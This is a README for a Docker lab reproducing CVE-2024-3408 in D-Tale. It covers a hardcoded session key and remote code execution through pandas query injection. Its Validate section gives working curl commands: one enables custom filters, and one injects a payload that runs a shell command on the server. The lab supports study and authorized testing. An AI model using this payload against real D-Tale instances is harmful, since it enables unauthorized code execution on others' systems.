# CVE-2024-3408 - D-Tale Authentication Bypass & RCE

Reproducible lab environment for CVE-2024-3408, an authentication bypass and remote code execution vulnerability in D-Tale.

## Vulnerability

D-Tale versions up to 3.15.1 are vulnerable due to:

1. **Hardcoded SECRET_KEY** (`"Dtale"`) for Flask session signing - allows session cookie forgery
2. **Code execution via custom filters** - the `test-filter` endpoint uses pandas query which can be abused to execute arbitrary Python code

**CVSS**: 9.8 (Critical)  
**Affected**: D-Tale <= 3.15.1

## Quickstart

```bash
docker compose up -d --build
```

D-Tale will be available at http://localhost:40000

## Validate

```bash
# Step 1: Enable custom filters
curl -s "http://localhost:40000/dtale/update-settings/1?settings=%7B%22enable_custom_filters%22%3Atrue%7D"
# Expected: {"success":true}

# Step 2: Execute command via pandas query injection
curl -s -G "http://localhost:40000/dtale/test-filter/1" \
  --data-urlencode "query=@pd.core.frame.com.builtins.__import__('os').popen('id').read()"
# Expected: Response contains "uid=" and "gid=" (command output in error message)
```

## Cleanup

```bash
docker compose down
```

## References

- [Huntr Report (CVE-2024-3408)](https://huntr.com/bounties/57a06666-ff85-4577-af19-f3dfb7b02f91)
- [Huntr Report (CVE-2025-0655)](https://huntr.com/bounties/f63af7bd-5438-4b36-a39b-4c90466cff13)
- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-3408)
- [D-Tale GitHub](https://github.com/man-group/dtale)

## Disclaimer

This lab is for educational and authorized security testing purposes only. Do not use against systems you don't own or have permission to test.

